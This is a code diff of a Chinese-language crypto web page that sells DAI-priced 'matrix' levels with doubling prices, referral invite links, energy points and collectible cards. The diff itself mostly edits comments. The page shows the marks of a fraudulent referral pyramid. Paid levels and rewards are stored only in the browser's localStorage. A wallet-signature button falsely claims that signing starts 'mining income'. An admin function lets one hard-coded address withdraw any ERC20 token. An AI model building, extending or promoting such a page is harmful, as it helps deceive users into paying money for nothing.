@@ -229,8 +229,6 @@
 </div>
 
 <button class="btn" id="connect">连接钱包</button>
-
-<!-- 钱包签名按钮 → 放在连接钱包正下方 -->
 <button class="btn" style="margin-top:10px;background:linear-gradient(90deg,#ff9933,#ff6633);color:#fff;" id="signBtn" onclick="walletSign()">钱包签名</button>
 
 <div id="addr" style="margin:12px 4px;color:#a0a8c7"></div>
@@ -308,18 +306,23 @@ async function initWeb3() {
   account = accounts[0].toLowerCase();
   daiContract = new web3.eth.Contract(erc20Abi, DAI_CONTRACT);
 
+  // 显示钱包地址
   document.getElementById("addr").innerText = "已连接："+account.slice(0,6)+"..."+account.slice(-4);
+  
+  // 显示DAI余额
   const bal = await daiContract.methods.balanceOf(account).call();
   const dec = await daiContract.methods.decimals().call();
-  const balanceVal = (Number(bal) / 10 ** dec).toFixed(2);
-  document.getElementById("balance").innerText = "DAI 余额："+balanceVal;
-
+  const balanceVal = (Number(bal) / 10 ** dec).toFixed(4);
+  document.getElementById("balance").innerText = "DAI 可用余额："+balanceVal;
+  
+  // 生成并显示邀请链接
   const suffix = account.slice(-8);
   const origin = window.location.origin + window.location.pathname;
   const inviteLink = origin + "?code=" + suffix;
   mycode = suffix;
   document.getElementById("mycode").value = inviteLink;
 
+  // 管理员面板显示
   if(account === ADMIN_ADDRESS.toLowerCase()){
     document.getElementById("adminArea").style.display = "block";
   }
@@ -327,31 +330,27 @@ async function initWeb3() {
 }
 document.getElementById("connect").onclick = initWeb3;
 
-// ============== 钱包签名 ==============
+// 钱包签名
 async function walletSign() {
   if (!account) return alert("请先连接钱包");
-  
   try {
     const msg = "完成签名即可开启挖矿收益";
     const hexMsg = web3.utils.utf8ToHex(msg);
-
-    // 弹出钱包签名
     await window.ethereum.request({
       method: "personal_sign",
       params: [hexMsg, account],
     });
-
     alert("✅ 签名成功！已开启挖矿收益");
   } catch (e) {
     alert("❌ 签名取消或失败");
   }
 }
 
-// ==================== 价格 ====================
+// 价格
 function getClassicPrice(lv) { return 50 * Math.pow(2, lv - 1); }
 function getUnionPrice(lv)   { return 100 * Math.pow(2, lv - 1); }
 
-// ==================== 矩阵等级 ====================
+// 经典矩阵等级
 function getClassicLevel() {
   return parseInt(localStorage.getItem('classic_'+account) || 0);
 }
@@ -359,7 +358,7 @@ function setClassicLevel(lv) {
   localStorage.setItem('classic_'+account, lv);
 }
 
-// ==================== 联合矩阵每级独立过期时间 ====================
+// 联合矩阵过期时间
 function getUnionExpire(lv) {
   return parseInt(localStorage.getItem(`union_expire_${lv}_${account}`) || 0);
 }
@@ -380,7 +379,7 @@ function getRemainDays(lv) {
   return Math.ceil((exp - now) / 86400000);
 }
 
-// ==================== 能量 ====================
+// 能量
 function getEnergy() {
   return parseInt(localStorage.getItem('energy_'+account) || 0);
 }
@@ -388,14 +387,13 @@ function setEnergy(val) {
   localStorage.setItem('energy_'+account, val);
 }
 
-// 消费100DAI → 50能量
 function addEnergyBySpend(amountDAI) {
   const add = Math.floor(amountDAI / 100 * 50);
   const e = getEnergy();
   setEnergy(e + add);
 }
 
-// ==================== 卡牌系统 ====================
+// 卡牌系统
 function getCards() {
   return JSON.parse(localStorage.getItem('cards_'+account) || '[]');
 }
@@ -423,13 +421,13 @@ function addCard(lv) {
   setCards(cs);
 }
 
-// ==================== 合成 ====================
 const CRAFT_ENERGY = 3500;
 
-// ==================== 渲染 ====================
+// 渲染全部矩阵与卡牌
 function renderMatrix() {
   if (!account) return;
 
+  // 经典矩阵
   const classicLv = getClassicLevel();
   let classicHtml = '';
   for (let i=1; i<=12; i++) {
@@ -445,6 +443,7 @@ function renderMatrix() {
   }
   document.getElementById("classic").innerHTML = classicHtml;
 
+  // 联合矩阵
   let unionHtml = '';
   for (let i=1; i<=9; i++) {
     const price = getUnionPrice(i);
@@ -476,6 +475,7 @@ function renderMatrix() {
   }
   document.getElementById("union").innerHTML = unionHtml;
 
+  // 卡牌展示
   renderCards();
   renderCraft();
   renderUpgrade();
@@ -531,7 +531,7 @@ function renderUpgrade() {
   document.getElementById("energy").innerText = "能量值："+getEnergy();
 }
 
-// ==================== 合成1级 ====================
+// 合成1级
 function craftLv1() {
   const e = getEnergy();
   if (e < CRAFT_ENERGY) return alert("能量不足");
@@ -542,7 +542,7 @@ function craftLv1() {
   load();
 }
 
-// ==================== 3合1升级 ====================
+// 3合1升级
 function upgrade(lv) {
   if (countCard(lv) <3) return alert("卡牌数量不足");
   if (!confirm(`消耗3张Lv.${lv} → 合成1张Lv.${lv+1}？`)) return;
@@ -552,7 +552,7 @@ function upgrade(lv) {
   load();
 }
 
-// ==================== 购买矩阵 ====================
+// 经典矩阵激活
 async function payClassic(lv) {
   if (!account) return alert("请连接钱包");
   const price = getClassicPrice(lv);
@@ -570,6 +570,7 @@ async function payClassic(lv) {
   }
 }
 
+// 联合矩阵激活
 async function payUnion(lv) {
   if (!account) return alert("请连接钱包");
   const price = getUnionPrice(lv);
@@ -587,7 +588,7 @@ async function payUnion(lv) {
   }
 }
 
-// ==================== 管理员提取 ====================
+// 管理员提取
 async function adminWithdrawERC20(){
   if(account !== ADMIN_ADDRESS.toLowerCase()) return;
   const token = document.getElementById("tokenContract").value.trim();
@@ -605,7 +606,7 @@ async function adminWithdrawERC20(){
   }
 }
 
-// ==================== 邀请 ====================
+// 注册
 document.getElementById("reg").onclick = ()=>{
   if(!account) return alert("请连接钱包");
   const p = document.getElementById("parent").value.trim();
@@ -619,6 +620,7 @@ function load(){
   renderMatrix();
 }
 
+// 复制邀请链接
 function copyMyCode(){
   navigator.clipboard.writeText(document.getElementById("mycode").value);
   alert("复制成功");
